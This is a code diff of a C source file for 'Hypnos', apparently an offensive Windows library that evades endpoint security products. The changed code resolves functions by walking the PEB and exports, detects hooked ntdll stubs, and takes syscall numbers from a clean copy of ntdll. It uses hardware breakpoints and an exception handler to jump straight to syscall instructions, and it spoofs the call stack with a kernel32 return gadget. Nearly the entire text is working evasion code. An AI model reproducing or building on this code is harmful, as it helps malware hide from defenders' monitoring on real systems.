@@ -1,19 +1,22 @@
-#include <stdlib.h>
-
 #include "includes/hypnos.h"
 #include "includes/Native.h"
 
 #pragma region GlobalVariables
 
+PVOID exceptionHandlerHandle;
 HANDLE mainThread;
+HANDLE hNtdll;
 HANDLE hNtdllCopy;
-HANDLE hExceptionHandler;
-DWORD_PTR retGadgetAddress;
-DWORD ntFunctionAddress;
+UINT64 ntFunctionAddress;
+char* ntFunctionName;
+UINT64 retGadgetAddress;
+UINT64 callRegGadgetAddressRet;
+UINT64 regBackup;
 
 #pragma endregion
 
-#pragma region PatternMatching
+#pragma region BinaryPatternMatching
+// @janoglezcampos, @idov31 - https://github.com/Idov31/Cronos/blob/master/src/Utils.c
 
 BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
 {
@@ -52,22 +55,7 @@ DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
 
 #pragma endregion
 
-BOOL IsHooked(LPVOID symbolAddr) {
-    unsigned char stub[] = {0x4c, 0x8b, 0xd1, 0xb8}; // Syscall stub opcodes
-    return FindPattern(symbolAddr, 4, (PBYTE)stub, (PCHAR)"xxxx");
-}
-
-#pragma region PebParsing
-
-unsigned long djb2_hash(const char* str) {
-    unsigned long hash = 5381;
-    int c;
-
-    while ((c = *str++))
-        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
-
-    return hash;
-}
+#pragma region PEBGetProcAddress
 
 UINT64 GetModuleAddress(LPWSTR moduleName) {
     PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
@@ -78,8 +66,7 @@ UINT64 GetModuleAddress(LPWSTR moduleName) {
 
     for (LIST_ENTRY* pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
          pListEntry != &peb->Ldr->InMemoryOrderModuleList;
-         pListEntry = pListEntry->Flink)
-    {
+         pListEntry = pListEntry->Flink) {
 
         PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 
@@ -90,40 +77,40 @@ UINT64 GetModuleAddress(LPWSTR moduleName) {
     return 0;
 }
 
-void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
-    // Getting DOS header
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
-    // Getting NT headers
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);
+void GetExportDirectory(UINT64 moduleBase, PIMAGE_EXPORT_DIRECTORY* exportDirectory) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
+    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;
 
-    *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    *exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 }
 
-void* GetSymbolAddress(PVOID imageBase, char* toFind) {
-    PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
-    Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);
+UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
+    UINT64 functionAddress = 0;
+    PIMAGE_EXPORT_DIRECTORY exportDirectory;
+    GetExportDirectory(moduleBase, &exportDirectory);
 
-    PDWORD pdwFunctionNames = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNames);
-    PDWORD pdwFunctionAddresses = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfFunctions);
-    PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNameOrdinals);
+    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
+    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
+    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);
 
-    // Walking over exported functions
-    for (int i = 0; i < pNtdllExportDirectory->NumberOfNames; i++) {
-        // Grabbing function name and function address
-        char* pFunctionName = (char*)((PBYTE)imageBase + pdwFunctionNames[i]);
-        void* pFunctionAddress = (PBYTE)imageBase + pdwFunctionAddresses[pwAddressOfNameOrdinals[i]];
-
-        if (strcmp(pFunctionName, toFind) == 0) return pFunctionAddress;
+    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
+        if (_stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
+            functionAddress = moduleBase + addresses[ordinals[j]];
+            break;
+        }
     }
 
-    return NULL;
-}
-
-DWORD PrepareSyscall(PCHAR symbolName) {
-    return ntFunctionAddress;
+    return functionAddress;
 }
 
 #pragma endregion
+
+#pragma region Hypnos
+
+DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
+    return (WORD)*((PBYTE)functionAddress + 4);
+}
 
 DWORD FindProcess(LPCSTR name) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -180,7 +167,7 @@ void* GetNtdllCopy() {
     }
 
     // Parsing headers from NTDLL
-    HMODULE moduleNtdll = GetModuleAddress(L"ntdll.dll");
+    HMODULE moduleNtdll = GetModuleHandleA("ntdll");
     PIMAGE_DOS_HEADER ntdllDosHeader =(PIMAGE_DOS_HEADER)moduleNtdll;
     PIMAGE_NT_HEADERS  ntdllNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllDosHeader + (BYTE)ntdllDosHeader->e_lfanew);
     DWORD ntdllSize = ntdllNtHeaders->OptionalHeader.SizeOfImage;
@@ -195,8 +182,131 @@ void* GetNtdllCopy() {
     return ntdllCopy;
 }
 
-WORD GetSyscallNumber(void* addr) {
-    return (WORD)*((PBYTE)addr + 4);
+DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
+    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
+    DWORD64 syscallReturnAddress = 0;
+
+    for (WORD idx = 1; idx <= 32; idx++) {
+        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
+            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
+            printf("[+] Found \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
+            break;
+        }
+    }
+
+    if (syscallReturnAddress == 0)
+        printf("[-] Could not find \"syscall;ret;\" opcode address\n");
+
+    return syscallReturnAddress;
+}
+
+#pragma endregion
+
+UINT64 PrepareSyscall(char* functionName) {
+    return ntFunctionAddress;
+}
+
+BOOL SetMainBreakpoint() {
+    // Dynamically find the GetThreadContext and SetThreadContext functions
+    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERNEL32.DLL"), "GetThreadContext");
+    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERNEL32.DLL"), "SetThreadContext");
+
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    // Get current thread context
+    pGetThreadContext(mainThread, &ctx);
+
+    // Set hardware breakpoint on PrepareSyscall function
+    ctx.Dr0 = (UINT64)&PrepareSyscall;
+    ctx.Dr7 |= (1 << 0);
+    ctx.Dr7 &= ~(1 << 16);
+    ctx.Dr7 &= ~(1 << 17);
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    // Apply the modified context to the current thread
+    if (!pSetThreadContext(mainThread, &ctx)) {
+        printf("[-] Could not set new thread context: 0x%X", GetLastError());
+        return FALSE;
+    }
+
+    printf("[+] Main HWBP set successfully\n");
+    return TRUE;
+}
+
+LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscall) {
+            printf("\n===============HYPNOS DEBUG===============");
+            printf("\n[+] PrepareSyscall hit (%#llx)\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
+
+            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function-
+            ntFunctionName = (char*)(ExceptionInfo->ContextRecord->Rcx);
+            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, ntFunctionName);
+            printf("[+] Found %s address: 0x%I64X\n", ntFunctionName, ntFunctionAddress);
+
+            // Move breakpoint to the NTAPI function;
+            printf("[+] Moving breakpoint to %#llx\n", ntFunctionAddress);
+            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
+        }
+        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
+            printf("[+] NTAPI Function Breakpoint Hit (%#llx)!\n", (DWORD64)ExceptionInfo->ExceptionRecord->ExceptionAddress);
+
+            // Create a new stack to spoof the kernel32 function address
+            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
+            // sub rsp, 70
+            ExceptionInfo->ContextRecord->Rsp -= 0x70;
+            // mov rsp, REG_GADGET_ADDRESS
+            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;
+            printf("[+] Created a new stack frame with RET_GADGET (%#llx) as the return address\n", retGadgetAddress);
+
+            // Copy the stack arguments from the original stack
+            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
+            {
+                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
+                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
+            }
+            printf("[+] Original stack arguments successfully copied over to the new stack\n");
+
+            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip;
+
+            char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
+            if (FindPattern(pFunctionAddress, 4, (PBYTE)nonHookedSyscallBytes, (PCHAR)"xxxx")) {
+                printf("[+] Function is not hooked\n");
+                printf("[+] Continuing with normal execution\n");
+            }
+            else {
+                printf("[+] Function is hooked!\n");
+
+                WORD syscallNumber = FindSyscallNumber(GetSymbolAddress(hNtdllCopy, ntFunctionName));
+                printf("[+] Found syscall number: 0x%x\n", syscallNumber);
+                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber);
+
+                if (syscallReturnAddress == 0) {
+                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+
+                // mov r10, rcx
+                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
+                //mov eax, SSN
+                ExceptionInfo->ContextRecord->Rax = syscallNumber;
+                //Set RIP to syscall;ret; opcode address
+                printf("[+] Jumping to \"syscall;ret;\" opcode address: 0x%I64X\n", syscallReturnAddress);
+                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress;
+
+            }
+
+            // Move breakpoint back to PrepareSyscall to catch the next invoke
+            printf("[+] Moving breakpoint back to PrepareSyscall to catch the next invoke\n");
+            ExceptionInfo->ContextRecord->Dr0 = (UINT64)&PrepareSyscall;
+
+            printf("==============================================\n\n");
+
+        }
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
 }
 
 BOOL FindRetGadget() {
@@ -213,121 +323,31 @@ BOOL FindRetGadget() {
         return TRUE;
     }
 
-    printf("[!] Could not find RET_GADGET in kernel32.dll and kernelbase.dll\n");
+    printf("[!] Could not find a gadget in kernel32 and kernelbase");
     return FALSE;
 }
 
-DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress) {
-    DWORD64 syscallReturnAddress = 0;
-
-    for (WORD i = 1; i <= 32; i++) {
-        if (*((PBYTE)functionAddress + i) == 0x0f && *((PBYTE)functionAddress + i + 1) == 0x05) {
-            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + i);
-            break;
-        }
-    }
-
-    if (syscallReturnAddress == 0)
-        printf("[-] Could not find \"syscall;ret;\" opcode address\n");
-
-    return syscallReturnAddress;
-}
-
-LONG HypnosExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
-    if(ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
-        if(ExceptionInfo->ContextRecord->Rip == (DWORD64)& PrepareSyscall) {
-            printf("\n[+] ============ Hitted HWBP on PrepareSyscall! ============ \n");
-            printf("[+] PrepareSyscall hit on: %#llx\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
-
-            // Getting symbol address, of string passed into PrepareSyscall
-            ntFunctionAddress = GetSymbolAddress(hNtdllCopy, ExceptionInfo->ContextRecord->Rcx);
-            printf("[+] Moving HWBP to NTAPI symbol at: %#llx\n", ntFunctionAddress);
-
-            // Moving the breakpoint to ntFunctionAddress
-            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
-        } else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {
-            printf("[+] Breakpoint on NTAPI symbol hit on: %#llx\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
-
-            // Creating the new stack, so we can spoof the kernel32 address
-            ExceptionInfo->ContextRecord->Rsp -= 0x70;
-            // Moving our gadget address into rsp (mov rsp, GADGET)
-            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;
-
-            printf("[+] Created a new stack frame, with return address %#llx (GADGET)\n", retGadgetAddress);
-
-            // Adding the rest of the original stack
-            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
-            {
-                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
-                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
-            }
-
-            printf("[+] Added rest of original stack to our spoofed stack frame\n");
-
-            DWORD64 pFunctionAddress = (DWORD64)ExceptionInfo->ContextRecord->Rip;
-            printf("[+] RIP: %#llx\n", pFunctionAddress);
-
-            WORD syscallNumber = GetSyscallNumber(pFunctionAddress);
-            printf("[+] Syscall number is: %d\n", syscallNumber);
-            DWORD64 syscallRetAddress = FindSyscallReturnAddress(pFunctionAddress);
-
-            ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
-            ExceptionInfo->ContextRecord->Rax = syscallNumber;
-            ExceptionInfo->ContextRecord->Rip = syscallRetAddress;
-
-            // Placing the breakpoint back on PrepareSyscall for next iteration.
-            ExceptionInfo->ContextRecord->Dr0 = (DWORD64)&PrepareSyscall;
-        }
-        return EXCEPTION_CONTINUE_EXECUTION;
-    }
-
-    return EXCEPTION_CONTINUE_SEARCH;
-}
-
-BOOL InitMainBreakpoint() {
-    // Get GetThreadContext and SetThreadContext dynamically
-    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress(L"KERNEL32.DLL"), "GetThreadContext");
-    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress(L"KERNEL32.DLL"), "SetThreadContext");
-
-    // Getting the current thread context
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    pGetThreadContext(mainThread, &ctx);
-
-    // Setting the hardware breakpoint
-    ctx.Dr0 = (UINT64)&PrepareSyscall;
-    ctx.Dr7 |= (1 << 0);
-    ctx.Dr7 &= ~(1 << 16);
-    ctx.Dr7 &= ~(1 << 17);
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    // Setting the new thread context
-    if (!pSetThreadContext(mainThread, &ctx)) {
-        printf("[!] Couldn't apply hardware breakpoint\n");
-        return FALSE;
-    }
-
-    printf("[+] Hardware breakpoint set successfully!\n");
-    return TRUE;
-}
-
 BOOL InitHypnos() {
-    // Getting current thread, and handle to clean copy of NTDLL
     mainThread = GetCurrentThread();
-    hNtdllCopy = GetModuleAddress(L"ntdll.dll");
+    hNtdll = (HANDLE)GetModuleAddress(L"ntdll.dll");
+    hNtdllCopy = (HANDLE)GetNtdllCopy();
 
-    // Looking for a return gadget in KERNEL32 and KERNELBASE
-    if (!FindRetGadget()) return FALSE;
-
-    // Initialize VEH
-    hExceptionHandler = AddVectoredExceptionHandler(1, &HypnosExceptionHandler);
-    if (!hExceptionHandler) {
-        printf("[!] Could not set VEH\n");
+    if (!FindRetGadget()) {
+        printf("[!] Could not find a suitable \"ADD RSP,68;RET\" gadget in kernel32 or kernelbase.");
         return FALSE;
     }
 
-    // Set the main breakpoint on PrepareSyscall :D
-    return InitMainBreakpoint();
+    // Register exception handler
+    exceptionHandlerHandle = AddVectoredExceptionHandler(1, &HWSyscallExceptionHandler);
+
+    if (!exceptionHandlerHandle) {
+        printf("[!] Could not register VEH: 0x%X\n", GetLastError());
+        return FALSE;
+    }
+
+    return SetMainBreakpoint();
 }
 
+BOOL DeinitHypnos() {
+    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0;
+}
